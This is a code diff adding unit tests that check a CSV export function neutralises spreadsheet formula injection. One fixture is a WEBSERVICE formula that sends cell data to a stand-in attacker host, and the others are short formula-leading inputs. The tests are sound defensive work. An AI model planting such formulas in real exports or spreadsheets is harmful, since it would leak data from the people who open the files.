@@ -53,6 +53,30 @@ describe('buildNudgeCsv', () => {
     expect(dataLine).toMatch(/"Hi Smith,\nThis is a multi-line\nmessage with ""quotes""\."/)
   })
 
+  it('neutralizes spreadsheet formula-injection payloads in provider-controlled cells', () => {
+    const csv = buildNudgeCsv([
+      {
+        ...baseCandidate,
+        name: '=WEBSERVICE("https://attacker.example/"&A1)',
+        renderedMessage: '@SUM(1+1)',
+      },
+    ])
+    const dataLine = csv.trim().split('\n')[1]
+    // Formula-leading cells are quoted AND prefixed with a single quote so the
+    // spreadsheet treats them as text instead of executing them.
+    expect(dataLine).toContain('"\'=WEBSERVICE(""https://attacker.example/""&A1)"')
+    expect(dataLine).toContain('"\'@SUM(1+1)"')
+    // The raw, unprefixed formula must not appear.
+    expect(dataLine).not.toMatch(/,=WEBSERVICE/)
+  })
+
+  it('neutralizes +, -, and @ formula leads too', () => {
+    for (const payload of ['+1+1', '-1+1', '@cmd']) {
+      const line = buildNudgeCsv([{ ...baseCandidate, name: payload }]).trim().split('\n')[1]
+      expect(line).toContain(`"'${payload}"`)
+    }
+  })
+
   it('joins skills with a pipe in the primary_skills column', () => {
     const csv = buildNudgeCsv([{ ...baseCandidate, skills: ['plumbing', 'painting'] }])
     expect(csv).toContain('plumbing|painting')
